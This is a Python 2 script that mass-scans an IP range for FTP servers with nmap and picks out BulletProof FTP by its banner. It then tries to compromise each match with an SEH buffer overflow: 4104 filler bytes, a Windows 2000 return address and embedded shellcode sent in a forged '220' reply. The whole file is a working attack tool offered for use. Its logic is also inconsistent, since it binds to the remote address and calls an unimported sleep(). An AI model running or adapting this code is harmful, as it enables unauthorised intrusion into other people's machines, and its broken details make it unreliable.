#!/usr/bin/python
#Uses nmap to scan ip range for open ftp ports,
#if open checks banner to see if BulletProofFTP is running.
#if so exploits using h07's sploit.
#d3hydr8[at]gmail[dot]com

import commands, sys, getopt, StringIO, re, time
from socket import *
from struct import pack

tmp, args = getopt.getopt(sys.argv[1:],"")
	
def scan():

	iprange = args[0]
	ip_list = []
	
	nmap = StringIO.StringIO(commands.getstatusoutput('nmap -P0 '+iprange+' -p 21 | grep open -B 3')[1]).readlines()
	
	for tmp in nmap:
		ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", tmp)
		if ipaddr:
	    		ip_list.append(ipaddr[0])
	print "[+]",len(ip_list), "hosts found with port 21 open...\n"	
	print "[+] Attempting to banner scan...\n"
	return ip_list
		
def banscan(iplist):
	
	finlist = []
	import socket
	for ip in iplist:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(10)
			s.connect((ip, 21))
			time.sleep(2)
			s.send("\r\n")
			response = s.recvfrom(1024)[0]
			s.close()
			if re.search("bulletproof", response.lower()) or re.search("v2.45", response.lower()):
				finlist.append(ip)	
		except socket.error:
			s.close()
   			pass
	if len(finlist) == 0: 
		print "\nCouldn't find any servers running BulletProofFTP\n"
		sys.exit(1)
	return finlist
	
def exploit(ipaddr):
	
	import socket
	
	shellcode = (
	"\x31\xc9\x83\xe9\xdb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
	"\x22\x72\xe4\x83\xeb\xfc\xe2\xf4\x24\xca\x34\xe4\xd8\x22\xf9\xa1"
	"\xe4\xa9\x0e\xe1\xa0\x23\x9d\x6f\x97\x3a\xf9\xbb\xf8\x23\x99\x07"
	"\xf6\x6b\xf9\xd0\x53\x23\x9c\xd5\x18\xbb\xde\x60\x18\x56\x75\x25"
	"\x12\x2f\x73\x26\x33\xd6\x49\xb0\xfc\x26\x07\x07\x53\x7d\x56\xe5"
	"\x33\x44\xf9\xe8\x93\xa9\x2d\xf8\xd9\xc9\xf9\xf8\x53\x23\x99\x6d"
	"\x84\x06\x76\x27\xe9\xe2\x16\x6f\x98\x12\xf7\x24\xa0\x2d\xf9\xa4"
	"\xd4\xa9\x02\xf8\x75\xa9\x1a\xec\x31\x29\x72\xe4\xd8\xa9\x32\xd0"
	"\xdd\x5e\x72\xe4\xd8\xa9\x1a\xd8\x87\x13\x84\x84\x8e\xc9\x7f\x8c"
	"\x28\xa8\x76\xbb\xb0\xba\x8c\x6e\xd6\x75\x8d\x03\x30\xcc\x8d\x1b"
	"\x27\x41\x13\x88\xbb\x0c\x17\x9c\xbd\x22\x72\xe4")

	port = 21
	LEN = 4104
	NEXT_SEH_RECORD = 0x909006EB  # JMP SHORT + 0x06
	SE_HANDLER = 0x77585A69       # POP POP RET (2000 SP4 Polish) 
	
	try:
		s = socket.socket(AF_INET, SOCK_STREAM)
		s.bind((ipaddr, port))
		s.listen(1)
		print "\n[+] Listening on %d ..." % port

		cl, addr = s.accept()
		print "[+] Connection accepted from %s" % ipaddr

		buffer = "220 "
		buffer += "A" * LEN
		buffer += pack("<L", NEXT_SEH_RECORD)
		buffer += pack("<L", SE_HANDLER)
		buffer += shellcode
		buffer += "\r\n"

		cl.send(buffer)
		print "[+] Sending buffer: OK\n"

		sleep(1)
		cl.close()
		s.close()
	except socket.error, msg:
		print "Encountered an error:", msg
		pass
		
	
#................................................
	
if args == []:
	print "\nUsage: ./bulletftp.py <ip range>"
	print "ex: ./bulletftp.py 192.168.1-10.0-255\n"
else:
	print "\n\t[ d3hydr8[at]gmail[dot]com BulletProof FTP scanner ]"
	print "\n[+] Scanning",args[0],"\n"
	finlist = banscan(scan())
	print "Attempting to exploit",len(finlist),"hosts running BulletProof FTP server...\n"
	for ip in finlist:
		exploit(ip)
	
	
	
